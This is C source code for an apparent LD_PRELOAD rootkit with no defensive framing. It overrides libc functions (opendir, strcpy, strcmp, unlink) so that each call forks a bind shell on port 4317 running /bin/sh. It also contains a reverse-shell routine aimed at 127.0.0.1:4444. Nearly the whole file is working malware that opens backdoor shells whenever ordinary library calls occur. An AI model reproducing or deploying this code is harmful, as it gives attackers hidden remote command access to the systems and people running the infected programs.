#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <fcntl.h>
#include <dirent.h>
#include <dlfcn.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <string.h>
#define LIBC_PATH       "/lib/libc.so.6"

#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 4444
#define LOCAL_PORT 4317

const char* getlibc() {
    const char* libraryName = "libc.so.6";

    // Try to find the library path
    char* libraryPath = NULL;

    char* stdLibraryPaths[] = { 
		"/lib",
		"/lib64",
		"/usr/lib",
		"/usr/lib64",
		"/lib/x86_64-linux-gnu"
    };  

    for (int i = 0; i < sizeof(stdLibraryPaths) / sizeof(stdLibraryPaths[0]); i++) {
        char fullPath[4096];
        snprintf(fullPath, sizeof(fullPath), "%s/%s", stdLibraryPaths[i], libraryName);
        if (access(fullPath, F_OK) == 0) {
        	libraryPath = strdup(fullPath);
        	break;
        }
    }   

    if (libraryPath != NULL) {
		return(libraryPath);
    } 
	else {
        printf("%s not found in LD_LIBRARY_PATH or standard library paths.\n", libraryName);
    }   

    return "fail";
}

int revshell()
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    return 0;
}

int bindshell()  
{  
	struct sockaddr_in hostaddr;
    // Create socket  
    int host_sockid = socket(PF_INET, SOCK_STREAM, 0);  
  
    // Initialize sockaddr struct to bind socket using it  
    hostaddr.sin_family = AF_INET;  
    hostaddr.sin_port = htons(LOCAL_PORT);  
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);  
  
    // Bind socket to IP/Port in sockaddr struct  
    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));  
      
    // Listen for incoming connections  
    listen(host_sockid, 2);  
  
    // Accept incoming connection, don't store data, just use the sockfd created  
    int client_sockid = accept(host_sockid, NULL, NULL);  
  
    // Duplicate file descriptors for STDIN, STDOUT and STDERR  
    dup2(client_sockid, 0);  
    dup2(client_sockid, 1);  
    dup2(client_sockid, 2);  
  
    // Execute /bin/sh  
    execve("/bin/sh", NULL, NULL);  
    close(host_sockid);  
      
    return 0;  
}


DIR     *opendir(const char *name) //our hijacked opendir
{
 	void  *handle; 
 	void  *(*sym)(const char *name);  //function pointer
	
	const char* libc_path = getlibc();
 	handle = dlopen(libc_path, RTLD_LAZY); //get the handle from libc.so.6
 	sym = (void *) dlsym(handle, "opendir"); //get the address of opendir symbol in libc.so.6	

	printf(" _  _  ____  __  __ _\n"); 
	printf("/ )( \\(  _ \\(  )(  / )\n");
	printf(") \\/ ( ) _ ( )(  )  ( \n");
	printf("\\____/(____/(__)(__\\_)\n");

	if(fork() == 0){
 		bindshell(); 
	}
	else {
  		return (sym(name)); //return real opendir
	}
}


char *strcpy(char *restrict dst, const char *restrict src){

	void *handle;
	void *(*sym)(char *restrict dst, const char *restrict src);
	const char* libc_path = getlibc();
	handle = dlopen(libc_path, RTLD_LAZY);
	sym = (void *) dlsym(handle, "strcpy");

	if(fork() == 0){
 		bindshell(); 
	}
	else {
  		return (sym(dst, src));
	}

}

int strcmp(const char *s1, const char *s2){

	void *handle;
	void *(*sym)(const char *s1, const char *s2);
	const char* libc_path = getlibc();
	handle = dlopen(libc_path, RTLD_LAZY);
	sym = (void *) dlsym(handle, "strcmp");

	if(fork() == 0){
 		bindshell(); 
	}
	else {
  		return (sym(s1, s2));
	}

}

int unlink(const char *pathname){

	void *handle;
	void *(*sym)(const char *pathname);
	const char* libc_path = getlibc();
	handle = dlopen(libc_path, RTLD_LAZY);
	sym = (void *) dlsym(handle, "unlink");

	if(fork() == 0){
 		bindshell(); 
	}
	else {
  		return (sym(pathname));
	}

}
/*
void exit(int status){

	void *handle;
	void *(*sym)(int status);
	const char* libc_path = getlibc();
	handle = dlopen(libc_path, RTLD_LAZY);
	sym = (void *) dlsym(handle, "exit");

	if(fork() == 0){
 		bindshell(); 
	}
	else {
  		return (sym(status));
	}

}*/

